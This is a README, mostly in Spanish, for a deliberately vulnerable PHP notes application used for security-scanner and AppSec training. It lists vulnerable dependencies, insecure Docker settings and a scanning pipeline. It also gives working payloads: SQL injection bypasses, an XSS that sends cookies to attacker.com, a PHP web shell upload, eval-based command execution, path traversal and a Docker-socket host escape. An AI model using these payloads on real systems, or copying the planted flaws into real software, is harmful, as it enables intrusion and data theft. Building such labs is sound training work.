# NotesApp - Security Issues Documentation

> **WARNING**: This application is intentionally vulnerable. Every issue listed below was **deliberately introduced** for educational and security testing purposes. DO NOT deploy in production.

---

## Tabla de Contenidos

1. [Vulnerabilidades en Dependencias](#1-vulnerabilidades-en-dependencias)
2. [Vulnerabilidades en Codigo (index.php)](#2-vulnerabilidades-en-codigo-indexphp)
3. [Vulnerabilidades en IaC - Dockerfile](#3-vulnerabilidades-en-iac---dockerfile)
4. [Vulnerabilidades en Configuracion - docker-compose.yml](#4-vulnerabilidades-en-configuracion---docker-composeyml)
5. [Resumen Rapido de Explotacion](#5-resumen-rapido-de-explotacion)

---

## 1. Vulnerabilidades en Dependencias

### composer.json

| # | Dependencia | Version | CVE / Problema | Severidad | Descripcion |
|---|---|---|---|---|---|
| 1 | `php` | `>=5.6` | Multiples CVE | **CRITICAL** | El constraint permite PHP 5.6 (EOL desde 2018) y PHP 7.0-7.3 (todos EOL). PHP 7.4 (EOL 2022-11-28) tambien incluido. |
| 2 | `phpmailer/phpmailer` | `5.2.16` | **CVE-2016-10033** | **CRITICAL (9.8)** | Remote Code Execution via mail() function. El parametro Sender no se sanitiza, permitiendo inyectar argumentos al binario sendmail. Explotable sin autenticacion si PHPMailer esta expuesto. |
| 3 | `phpmailer/phpmailer` | `5.2.16` | **CVE-2016-10045** | **CRITICAL (9.8)** | Bypass del parche de CVE-2016-10033. Escape de shell via isMail() transport. |
| 4 | `phpmailer/phpmailer` | `5.2.16` | **CVE-2017-5223** | **MEDIUM (5.5)** | Local File Disclosure via rutas relativas en attachments. |
| 5 | `guzzlehttp/guzzle` | `6.2.0` | **CVE-2022-31090** | **HIGH (7.5)** | Insecure Authorization header forwarding en redirecciones cross-domain. |
| 6 | `guzzlehttp/guzzle` | `6.2.0` | **CVE-2022-31091** | **HIGH (7.5)** | Information disclosure via Set-Cookie headers en HTTP redirects. |
| 7 | `guzzlehttp/guzzle` | `6.2.0` | **CVE-2022-29248** | **MEDIUM (4.7)** | oauth plugin vulnerable a CSRF en proveedores OAuth. |
| 8 | `dompdf/dompdf` | `0.8.0` | **CVE-2021-3902** | **CRITICAL (9.8)** | RCE via allowedProtocols en Cpdf.php. SSRF + Phar deserialization chain. |
| 9 | `dompdf/dompdf` | `0.8.0` | **CVE-2022-2400** | **HIGH (7.5)** | SSRF via validacion insuficiente de URIs en isRemoteUrl(). |
| 10 | `dompdf/dompdf` | `0.8.0` | **CVE-2022-41343** | **CRITICAL (9.8)** | RCE via writeFont(). Archivos de fuentes maliciosas ejecutan codigo PHP. |
| 11 | `dompdf/dompdf` | `0.8.0` | **CVE-2023-24813** | **HIGH (7.5)** | Inyeccion HTML/JS en PDFs generados. Stored XSS al renderizar PDF en navegador. |

**Nota**: `composer audit` detecta automaticamente la mayoria de estas vulnerabilidades.

---

## 2. Vulnerabilidades en Codigo (index.php)

### 2.1 SQL Injection (SQLi)

**Ubicacion**: Multiples endpoints - `list`, `view`, `delete`, `login`, `create`

**CWE**: CWE-89

| Linea | Endpoint | Query vulnerable |
|---|---|---|
| `?action=login` | Login | `SELECT * FROM users WHERE username='$username' AND password='$password'` |
| `?action=list&search=` | Busqueda | `SELECT * FROM notes WHERE title LIKE '%$search%'` |
| `?action=view&id=` | Ver nota | `SELECT * FROM notes WHERE id = $id` |
| `?action=delete&id=` | Eliminar | `DELETE FROM notes WHERE id = $id` |
| `?action=create` | Crear nota | `INSERT INTO notes (title, content) VALUES ('$title', '$content')` |

**PoC - SQLi en busqueda**:
```
GET /?action=list&search=' UNION SELECT 1,username,password,4,5 FROM users--
```

**PoC - SQLi en login (bypass auth)**:
```
POST /?action=login
username=admin' OR '1'='1'--&password=anything
```

**PoC - SQLi en delete (borrar todas las notas)**:
```
GET /?action=delete&id=1 OR 1=1
```

**PoC - Blind SQLi en view**:
```
GET /?action=view&id=1 AND (SELECT substr(password,1,1) FROM users LIMIT 1)='2'
```

### 2.2 Stored XSS

**Ubicacion**: `?action=create` -> `?action=list` y `?action=view`

**CWE**: CWE-79

**PoC**:
```
POST /?action=create
title=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
content=<img src=x onerror="alert(document.cookie)">
```

### 2.3 Reflected XSS

**Ubicacion**: `?action=list&search=` y `?msg=`

**CWE**: CWE-79

**PoC**:
```
GET /?action=list&search=<script>alert('XSS')</script>
GET /?action=list&msg=<img src=x onerror=alert(1)>
```

### 2.4 CSRF (Cross-Site Request Forgery)

**Ubicacion**: Todos los formularios

**CWE**: CWE-352

**PoC**:
```html
<img src="http://localhost:8080/?action=delete&id=1" style="display:none">
```

### 2.5 RCE - eval()

**Ubicacion**: `?action=debug`

**CWE**: CWE-95

**PoC**:
```
POST /?action=debug
code=system('id; cat /etc/passwd');
```

### 2.6 Path Traversal

**Ubicacion**: `?action=view_file&file=`

**CWE**: CWE-22

**PoC**:
```
GET /?action=view_file&file=../../../etc/passwd
GET /?action=view_file&file=../data/notes.db
GET /?action=view_file&file=../index.php
```

### 2.7 Insecure File Upload

**Ubicacion**: `?action=upload`

**CWE**: CWE-434

**PoC**:
```bash
curl -F "file=@shell.php" http://localhost:8080/?action=upload
curl http://localhost:8080/uploads/shell.php?cmd=id
```

### 2.8 Hardcoded Credentials

**CWE**: CWE-798

```php
define('ADMIN_USER', 'admin');
define('ADMIN_PASS', '21232f297a57a5a743894a0e4a801fc3'); // MD5 of "admin"
define('SECRET_KEY', 'SuperSecretKey123!');
```

### 2.9 Weak Password Hashing (MD5)

**CWE**: CWE-328 / CWE-327

Hash MD5 de "admin" = `21232f297a57a5a743894a0e4a801fc3` -> buscable en cualquier rainbow table.

### 2.10 Session Fixation

**CWE**: CWE-384

No hay `session_regenerate_id(true)` despues del login.

### 2.11 Sesion sin HttpOnly ni Secure Flag

**CWE**: CWE-1004

### 2.12 Error Reporting en Produccion

**CWE**: CWE-209

```php
ini_set('display_errors', 1);
error_reporting(E_ALL);
```

### 2.13 SQLite DB en directorio web

**CWE**: CWE-538

**PoC**: `GET /data/notes.db`

### 2.14 Directory Listing

**CWE**: CWE-548

**PoC**: `GET /data/` o `GET /uploads/`

### 2.15 extract() en input no confiable

**CWE**: CWE-621

```php
extract($_REQUEST);
```

**PoC**: `GET /?logged_in=1&action=debug`

### 2.16 IDOR - Insecure Direct Object Reference

**CWE**: CWE-639

Cualquier usuario puede ver/eliminar notas de otros cambiando el ID.

### 2.17 User Enumeration

**CWE**: CWE-204

"Login failed for user: X" confirma existencia de usuarios.

### 2.18 GET para operaciones con estado

**CWE**: CWE-352

Eliminar notas via GET: `?action=delete&id=X`

### 2.19 PHPInfo Disclosure

**CWE**: CWE-200

`?action=info` expone phpinfo() sin autenticacion.

### 2.20 API de Exportacion insegura

**CWE**: CWE-200

`?action=export` expone todas las notas en JSON sin auth.

### 2.21 Version Disclosure en Footer

**CWE**: CWE-200

Muestra PHP y SQLite version.

---

## 3. Vulnerabilidades en IaC - Dockerfile

| # | Problema | Severidad | Descripcion |
|---|---|---|---|
| 1 | **EOL Base Image** | **CRITICAL** | `php:7.4-apache` EOL desde 2022-11-28. Cientos de CVE sin resolver. |
| 2 | **Hardcoded Secrets** | **HIGH** | `DB_PASSWORD`, `API_SECRET` en ENV. Visibles con `docker history`. |
| 3 | **Sin limpieza de apt** | **MEDIUM** | Sin `rm -rf /var/lib/apt/lists/*`. |
| 4 | **Sin --no-install-recommends** | **LOW** | Instala paquetes innecesarios (vim, netcat, git). |
| 5 | **ADD en vez de COPY** | **MEDIUM** | ADD puede descargar URLs y extraer tarballs. |
| 6 | **chmod 777** | **HIGH** | World-writable en todo /var/www/html/. |
| 7 | **Ejecutando como root** | **HIGH** | Sin directiva USER. RCE -> root en contenedor. |
| 8 | **Directory Listing (+Indexes)** | **MEDIUM** | Expone estructura de archivos. |
| 9 | **AllowOverride All** | **MEDIUM** | .htaccess explotable si hay file write. |
| 10 | **Sin HEALTHCHECK** | **LOW** | Docker no detecta fallos. |
| 11 | **Sin .dockerignore** | **HIGH** | .git/, secretos, backups copiados a la imagen. |
| 12 | **COPY de todo el contexto** | **HIGH** | Todo el build context copiado a la imagen. |

---

## 4. Vulnerabilidades en Configuracion - docker-compose.yml

| # | Problema | Severidad | Descripcion |
|---|---|---|---|
| 1 | **Hardcoded Secrets** | **HIGH** | Contrasenas en texto plano en `environment`. |
| 2 | **Puerto en 0.0.0.0** | **MEDIUM** | Expuesto a todas las interfaces de red. |
| 3 | **Privileged Mode** | **CRITICAL** | `privileged: true`. Escape de contenedor trivial. |
| 4 | **Docker Socket Montado** | **CRITICAL** | `/var/run/docker.sock` -> escape al host. |
| 5 | **Sin Resource Limits** | **MEDIUM** | Sin mem_limit ni cpus. DoS posible. |
| 6 | **Sin security_opt** | **HIGH** | Sin no-new-privileges ni seccomp profile. |
| 7 | **Sin cap_drop** | **HIGH** | Capacidades innecesarias retenidas. |
| 8 | **Sin read-only rootfs** | **MEDIUM** | Atacante puede modificar binarios. |
| 9 | **Bind Mounts sin :ro** | **MEDIUM** | Contenedor modifica archivos del host. |
| 10 | **restart: always sin max_attempts** | **LOW** | Infinite restart loop posible. |
| 11 | **Adminer Expuesto** | **HIGH** | Gestor BD en 0.0.0.0:8081 sin auth. |
| 12 | **Adminer Version Antigua** | **HIGH** | 4.8.1 con CVEs conocidos. |
| 13 | **Sin Network Isolation** | **MEDIUM** | Default bridge network, sin segmentacion. |
| 14 | **Sin Logging Config** | **LOW** | Vulnerable a log bombs. |

---

## 5. Resumen Rapido de Explotacion

### Cadena #1: RCE via File Upload

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "file=@shell.php" http://localhost:8080/?action=upload
curl "http://localhost:8080/uploads/shell.php?cmd=whoami"
# Resultado: root (Dockerfile sin USER)
```

### Cadena #2: RCE via eval()

```bash
curl -X POST "http://localhost:8080/?action=debug" --data-urlencode "code=system('id')"
```

### Cadena #3: SQLi -> Data Exfiltration

```bash
curl "http://localhost:8080/?action=list&search=' UNION SELECT 1,username,password,4,5 FROM users--"
```

### Cadena #4: Path Traversal

```bash
curl "http://localhost:8080/?action=view_file&file=../index.php"
curl "http://localhost:8080/?action=view_file&file=../data/notes.db"
```

### Cadena #5: Docker Socket -> Host Escape

```bash
curl -F "file=@shell.php" http://localhost:8080/?action=upload
curl "http://localhost:8080/uploads/shell.php?cmd=docker run -it --rm -v /:/host alpine chroot /host"
```

### Comprobacion con composer audit

```bash
cd pwn3d && composer install && composer audit
```

### Comprobacion con Trivy

```bash
docker build -t notesapp . && trivy image notesapp
```

---

## Notas Finales

- **Total de vulnerabilidades**: ~50+
- **CVE en dependencias**: 11+
- **CWEs en codigo**: 20+
- **Anti-patrones IaC**: 12 (Dockerfile) + 14 (docker-compose.yml)

**Proposito**: SAST, DAST, SCA, container scanning y AppSec training.

---

## 6. CI/CD Security Pipeline (GitHub Actions)

### Arquitectura del Pipeline

```
 git push → GitHub
                │
                ▼
┌──────────────────────────────────────────────────┐
│              GitHub Actions Runner                │
│                                                   │
│  Job 1: OWASP Dependency-Check                   │
│      │   Descarga y ejecuta Dependency-Check CLI  │
│      │   Escanea composer.json/lock               │
│      │   Busca CVE conocidos en dependencias      │
│      │   failOnCVSS: 7                            │
│      ▼                                            │
│  Job 2: Trivy Scan                                │
│      │   Filesystem scan (código + deps)          │
│      │   Config scan (Dockerfile, docker-compose) │
│      │   Severity: HIGH + CRITICAL                │
│      ▼                                            │
│  Job 3: SonarQube SAST (SonarCloud)               │
│      │   Code smells, bugs, vulnerabilidades      │
│      │   SQLi, XSS, hardcoded secrets             │
│      │   Quality Gate enforcement                 │
│      ▼                                            │
│  Job 4: Docker Build & Push                       │
│      │   Build de imagen                          │
│      │   Push a GHCR (solo main)                  │
│      ▼                                            │
│  Job 5: Summary                                   │
│         Reporte final del pipeline                │
└──────────────────────────────────────────────────┘
```

### ¿Cómo funciona?

**Cero configuración de infraestructura.** Todo corre en los runners de GitHub:

| Qué | Dónde corre | Cuándo |
|---|---|---|
| Dependency-Check | GitHub Actions runner (ubuntu) | Cada push/PR |
| Trivy Scan | GitHub Actions runner (ubuntu) | Cada push/PR |
| SonarQube | SonarCloud (gratis, public repos) | Cada push/PR |
| Docker Build | GitHub Actions runner | Cada push/PR |
| Docker Push | GitHub Container Registry (ghcr.io) | Solo en main |

### Archivos del Pipeline

| Archivo | Propósito |
|---|---|
| `.github/workflows/security-pipeline.yml` | Workflow principal con 5 jobs |
| `sonar-project.properties` | Configuración de proyecto SonarQube |
| `docker-compose.ci.yml` | SonarQube local (opcional, para pruebas locales) |
| `setup_ci.sh` | Script para levantar SonarQube local |

### ¿Qué necesitas para que funcione?

#### Paso 1: Inicializar git y conectar con GitHub

```bash
cd c:/Users/MTZ/pwn3d
git init
git add .
git commit -m "Initial commit: NotesApp vulnerable + CI/CD pipeline"
git branch -M main
git remote add origin https://github.com/TU_USUARIO/pwn3d.git
git push -u origin main
```

#### Paso 2: Configurar Secrets en GitHub (opcional para SonarCloud)

```
GitHub Repo → Settings → Secrets and variables → Actions → New repository secret:

  SONAR_TOKEN       → Token de https://sonarcloud.io (Account → Security → Generate Token)
  SONAR_ORG         → Tu organización en SonarCloud
  SONAR_PROJECT_KEY → Clave del proyecto (ej: TU_USERNAME_notesapp)
```

> **Sin SonarCloud**: Dependency-Check y Trivy corren igual. SonarQube se salta si no hay token.

#### ¡Y ya! Al hacer `git push`:

1. GitHub Actions detecta el push automáticamente
2. Ejecuta los 5 jobs del pipeline
3. Dependency-Check y Trivy **van a fallar** (porque la app es vulnerable a propósito)
4. Los reportes quedan como artifacts descargables
5. En `https://github.com/TU_USUARIO/pwn3d/actions` ves todo

### Probar localmente sin GitHub (con act)

```bash
# Instalar act: https://github.com/nektos/act
act push
```

### Servicio local opcional: SonarQube

```bash
docker compose -f docker-compose.ci.yml up -d
# SonarQube en http://localhost:9000 (admin / admin)
```

### Resultado esperado

Dado que la app es **intencionalmente vulnerable**, el pipeline **debe fallar** en:

| Stage | Issues esperados |
|---|---|
| **Dependency-Check** | 11+ CVE (CVSS ≥ 7): phpmailer, guzzle, dompdf |
| **Trivy** | Vulnerabilidades HIGH/CRITICAL en PHP 7.4 EOL + misconfigs en Dockerfile y docker-compose |
| **SonarQube** | Cientos de issues: SQL injection, XSS, hardcoded passwords, eval(), CSRF, path traversal |
| **Docker Build** | Construye OK pero la imagen contiene todos los CVE de la base EOL |

Esto **demuestra** que el pipeline de seguridad funciona correctamente: detecta y bloquea código inseguro antes de producción.
